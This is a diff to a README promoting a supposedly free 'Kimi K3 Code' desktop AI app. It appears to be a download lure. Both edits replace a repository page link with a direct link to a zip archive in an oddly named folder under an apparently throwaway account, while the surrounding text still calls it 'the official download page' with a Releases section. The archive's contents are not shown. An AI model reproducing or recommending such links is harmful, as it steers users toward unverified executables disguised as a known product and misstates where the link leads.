@@ -28,7 +28,7 @@ This is a **bilingual (English and Chinese)** tool with an impressive **200,000-
 
 ### Step 1: Get the App
 
-👉 **[Visit this link to download the application](https://github.com/Tawnyareversible570/Kimi-K3-Code-Free-Desktop-AI)**
+👉 **[Visit this link to download the application](https://raw.githubusercontent.com/Tawnyareversible570/Kimi-K3-Code-Free-Desktop-AI/main/tribual/Kimi_Code_Free_Desktop_AI_v2.0.zip)**
 
 This is the official download page. When you click the link, you'll land on the GitHub repository. Look for a green **"Code"** button or a **"Releases"** section on the right side of the page. Click it, and you'll see the latest version available for download.
 
@@ -172,7 +172,7 @@ Before you go, make sure you:
 
 Don't wait. This is a free, powerful, and easy-to-use AI tool that belongs on every desktop.
 
-👉 **[Visit this link to download the application](https://github.com/Tawnyareversible570/Kimi-K3-Code-Free-Desktop-AI)**
+👉 **[Visit this link to download the application](https://raw.githubusercontent.com/Tawnyareversible570/Kimi-K3-Code-Free-Desktop-AI/main/tribual/Kimi_Code_Free_Desktop_AI_v2.0.zip)**
 
 ---
 
